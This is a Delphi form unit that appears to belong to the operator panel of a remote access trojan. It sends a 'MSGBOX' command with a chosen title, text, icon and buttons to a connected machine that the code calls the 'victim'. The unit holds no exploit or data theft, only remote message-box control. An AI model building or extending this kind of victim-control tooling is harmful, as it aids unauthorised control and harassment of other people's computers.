unit FrmMsgbox;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, acPNG, Vcl.ExtCtrls;

type
  TForm7 = class(TForm)
    ComboBox1: TComboBox;
    GroupBox1: TGroupBox;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    RadioButton3: TRadioButton;
    RadioButton4: TRadioButton;
    RadioButton5: TRadioButton;
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    Image4: TImage;
    Image5: TImage;
    Edit1: TEdit;
    Memo1: TMemo;
    Button1: TButton;
    procedure Image1Click(Sender: TObject);
    procedure Image2Click(Sender: TObject);
    procedure Image3Click(Sender: TObject);
    procedure Image4Click(Sender: TObject);
    procedure Image5Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form7: TForm7;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm7.Button1Click(Sender: TObject);
var
  Title, Msg, IconType, ButtonType: string;
begin
  Title := Edit1.Text;
  Msg := Memo1.Text;

  // Determine which icon should be used based on the selected radio button
  if RadioButton1.Checked then
    IconType := 'INFO'
  else if RadioButton2.Checked then
    IconType := 'WARNING'
  else if RadioButton3.Checked then
    IconType := 'ERROR'
  else if RadioButton4.Checked then
    IconType := 'QUESTION'
  else if RadioButton5.Checked then
    IconType := 'NONE';

  // Determine which buttons to show based on ComboBox1 selection
  case ComboBox1.ItemIndex of
    0: ButtonType := 'OK';
    1: ButtonType := 'YESNO';
    2: ButtonType := 'OKCANCEL';
    3: ButtonType := 'ABORTRETRYIGNORE';
  else
    ButtonType := 'OK';  // Default to OK if nothing is selected
  end;

  // Send the command with both icon type and button type included
  SendToSelectedClient(ThisFormsVictimID,'MSGBOX|' + Title + '|' + Msg + '|' + IconType + '|' + ButtonType);
end;


procedure TForm7.Image1Click(Sender: TObject);
begin
  RadioButton1.Checked := true;
end;

procedure TForm7.Image2Click(Sender: TObject);
begin
  RadioButton2.Checked := true;
end;

procedure TForm7.Image3Click(Sender: TObject);
begin
  RadioButton3.Checked := true;
end;

procedure TForm7.Image4Click(Sender: TObject);
begin
  RadioButton4.Checked := true;
end;

procedure TForm7.Image5Click(Sender: TObject);
begin
  RadioButton5.Checked := true;
end;

end.
